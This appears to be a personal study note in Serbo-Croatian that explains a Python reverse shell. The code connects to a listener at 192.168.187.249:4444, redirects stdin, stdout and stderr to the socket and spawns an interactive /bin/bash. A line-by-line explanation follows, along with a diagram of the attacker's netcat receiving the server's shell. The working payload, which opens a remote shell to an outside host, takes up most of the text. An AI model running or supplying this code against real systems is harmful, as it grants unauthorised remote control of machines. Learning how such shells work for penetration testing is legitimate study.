# Kod
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.187.249",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2) 
pty.spawn("/bin/bash")

# Objasnjenje
import socket,subprocess,os,pty
- ucitava mrezu(socket), komande(subprocess), rad sa sistemom(os), terminal(pty)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
- stvara konekciju
- AF_NET je IPv4
- SOCK_STREAM je TCP

s.connect(("MOJA IP ADRESA",4444))
- povezuje se na moju ip adresu i port

os.dup2(s.fileno(),0) - stdin, sta kucam ide kroz socket
os.dup2(s.fileno(),1) - stdout, rezultat se vraca
os.dup2(s.fileno(),2) - stderr, prikaz gresaka
s.fileno() - file descriptor socketa

pty.spawn("/bin/bash")
- pokrece bash shell, interaktivni terminal na koji sam navikao

[Moj nc]  <==== TCP ====  [Server bash]
